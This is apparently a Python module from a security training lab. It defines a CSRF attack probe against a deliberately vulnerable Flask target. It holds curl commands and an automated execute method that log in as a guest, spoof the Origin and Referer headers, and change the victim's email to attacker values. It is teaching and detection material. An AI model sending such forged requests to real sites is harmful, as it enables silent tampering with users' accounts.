"""
modules/csrf.py — APP-05: Cross-Site Request Forgery probe.

Target: POST /profile/update
Vulnerability: No CSRF token required — any POST from any origin accepted.
"""
from __future__ import annotations

from datetime import datetime, timezone

from core.base_module import BaseModule
from core.models import (
    AttackResult, Category, ModuleOption, Severity,
    StepResult, TargetConfig,
)


class CSRFModule(BaseModule):
    module_id = "csrf"
    name = "CSRF Forged Request"
    description = (
        "Demonstrates Cross-Site Request Forgery by sending a state-changing "
        "POST to /profile/update with no CSRF token and a spoofed Origin header."
    )
    category = Category.WEB
    scenario_id = "APP-05"
    severity = Severity.MEDIUM
    # MITRE ATT&CK — abuse a valid session via a malicious link to forge a
    # state-changing request. (CSRF has no exact ATT&CK technique; mapped to the
    # closest user-execution + data-manipulation behaviours.)
    mitre = {
        "tactics": ["TA0001 Initial Access", "TA0040 Impact"],
        "techniques": [
            {"id": "T1204.001", "name": "User Execution: Malicious Link", "tactic": "Execution"},
            {"id": "T1565.001", "name": "Data Manipulation: Stored Data Manipulation", "tactic": "Impact"},
            {"id": "T1078", "name": "Valid Accounts", "tactic": "Defense Evasion"},
        ],
    }
    lab = {
        "target_path": "/profile/",
        "vulnerable_component": "Flask profile update (profile_bp.update)",
        "story": (
            "The profile update form posts to /profile/update with no CSRF "
            "token, no Origin check, and no SameSite cookie. Use the built-in "
            "attacker lure page at /evil/csrf-demo to prove that a forged "
            "request from another page can silently change user data."
        ),
        "learner_steps": [
            {"action": "Establish a victim session (abuse a valid account).",
             "technique": "T1078 Valid Accounts",
             "command": "curl -s -c jar.txt -d 'username=guest&password=guest' http://target-agent/auth/login -o /dev/null",
             "expected": "A session cookie is stored in jar.txt — you are 'the logged-in victim'."},
            {"action": "Recon the update form — confirm there is NO anti-CSRF token.",
             "technique": "T1595.002 Active Scanning: Vulnerability Scanning",
             "command": "curl -s -b jar.txt http://target-agent/profile/ | grep -i csrf || echo 'no csrf token field'",
             "expected": "The form has no hidden _csrf_token field — it is forgeable."},
            {"action": "Forge a cross-origin state-changing POST (the lure click).",
             "technique": "T1204.001 User Execution: Malicious Link",
             "command": "curl -s -b jar.txt -H 'Origin: http://evil.lab' -H 'Referer: http://evil.lab/evil/csrf-demo' -d 'email=hacked@evil.lab' http://target-agent/profile/update | grep -i updated",
             "expected": "The server accepts the forged request with no token / foreign Origin."},
            {"action": "Verify the victim's data was changed (impact).",
             "technique": "T1565.001 Data Manipulation: Stored Data Manipulation",
             "command": "curl -s -b jar.txt http://target-agent/profile/ | grep hacked@evil.lab",
             "expected": "The profile now shows the attacker's email — CSRF impact confirmed."},
            {"action": "Click Check Progress in ATTENSE to review the evidence.",
             "technique": "T1565.001 Data Manipulation: Stored Data Manipulation",
             "command": "# review the activity log / Wazuh feed in ATTENSE",
             "expected": "Evidence includes csrf_token_missing and profile_changed_without_csrf."},
        ],
        "detection_rule": "Wazuh CSRF/mismatched-origin signature on /profile/update",
        "success_markers": [
            "'Profile updated' in the POST response",
            "✓ STATE CHANGED log lines",
            "csrf_lure_visited evidence",
            "csrf_lure_submitted evidence",
            "profile_changed_without_csrf evidence",
        ],
        "quick_probe": "/profile/",
    }
    steps = [
        {'title': 'Acquire an authenticated session', 'tactic': 'Defense Evasion',
         'technique': 'T1078 Valid Accounts',
         'command': "curl -s -c jar.txt -d 'username=guest&password=guest' http://target-agent/auth/login",
         'hint': 'Log in as a known user to obtain the session cookie', 'expected': 'Cookie set by /auth/login'},
        {'title': 'Forge state-changing POST', 'tactic': 'Execution',
         'technique': 'T1204.001 User Execution: Malicious Link',
         'command': "curl -s -b jar.txt -H 'Origin: http://evil.lab' -d 'email=pwned@evil.lab' http://target-agent/profile/update",
         'hint': 'POST /profile/update with no CSRF token, no Referer', 'expected': 'Server accepts the forged request (200 OK)'},
        {'title': 'Verify the mutation succeeded', 'tactic': 'Impact',
         'technique': 'T1565.001 Data Manipulation: Stored Data Manipulation',
         'command': "curl -s -b jar.txt http://target-agent/profile/ | grep pwned@evil.lab",
         'hint': 'Re-read /profile/ and confirm the email was changed', 'expected': 'Profile contains attacker-supplied value'},
    ]

    def options(self) -> list[ModuleOption]:
        return [
            ModuleOption(
                name="new_email",
                display_name="Forged Email",
                description="Email to set via CSRF (simulates attacker-controlled value)",
                default="pwned@evil.lab",
            ),
        ]

    def execute(self, target: TargetConfig, opts: dict, log_fn=None) -> AttackResult:
        started = datetime.now(timezone.utc).isoformat()
        steps: list[StepResult] = []
        new_email = opts.get("new_email", "pwned@evil.lab")

        # Step 1: Authenticate as 'guest' to establish a session
        self._log(log_fn, "Authenticating as 'guest' to get a session cookie...")
        r_login = self._post(
            target.base_url + "/auth/login",
            data={"username": "guest", "password": "guest"},
            label="login-guest",
            timeout=target.timeout,
        )
        steps.append(r_login)
        self._log(log_fn, f"  Login: HTTP {r_login.status_code}")

        # Step 2: Forged POST with no CSRF token and a spoofed cross-origin
        # Origin/Referer — exactly what the attacker lure page would send.
        # Headers are applied *to the request itself* (T1204.001 lure click).
        self._log(log_fn, f"Sending CSRF payload (email → {new_email})...")
        forged_emails = [new_email, "exfil@attacker.lab"]
        forged_headers = {
            "Origin":  "http://evil.lab.local",
            "Referer": target.base_url + "/evil/csrf-demo",
        }

        for email in forged_emails:
            r = self._post(
                target.base_url + "/profile/update",
                data={"email": email},
                headers=forged_headers,
                label=f"csrf-{email}",
                timeout=target.timeout,
            )

            changed = (
                "Email updated successfully" in (r.detail or "")
                or "Profile updated" in (r.detail or "")
                or email in (r.detail or "")
            )
            if changed:
                r.evidence = f"STATE CHANGED: email set to {email}"
                self._log(log_fn, f"  ✓ STATE CHANGED  → {email}")
            else:
                self._log(log_fn, f"  – no change detected  → {email}")

            steps.append(r)

        changed_count = sum(1 for s in steps if s.evidence)
        summary = f"{changed_count} forged state changes accepted without CSRF token."
        return self._make_result(target, steps, summary, started)
